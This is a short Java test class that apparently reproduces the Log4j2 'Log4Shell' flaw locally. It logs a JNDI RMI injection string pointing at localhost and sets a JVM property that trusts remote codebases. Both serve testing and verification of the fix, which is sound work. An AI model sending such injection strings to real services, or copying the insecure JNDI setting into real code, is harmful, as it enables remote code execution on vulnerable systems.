package ai.shanshu.testlog;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Date: 2021/12/16 9:31 下午
 * @author yuhui
 */
public class Test {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     * solution of log4j2
     * @see https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot
     * @param args 参数
     */
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.rmi.server.useCodebaseOnly","true");
        String testHw = "${java:hw}";
        String testVm = "${java:vm}";
        String testRmi = "${jndi:rmi://127.0.0.1:9999/hack}";
        LOGGER.error(testHw);
        LOGGER.error(testVm);
        LOGGER.error(testRmi);
    }
}
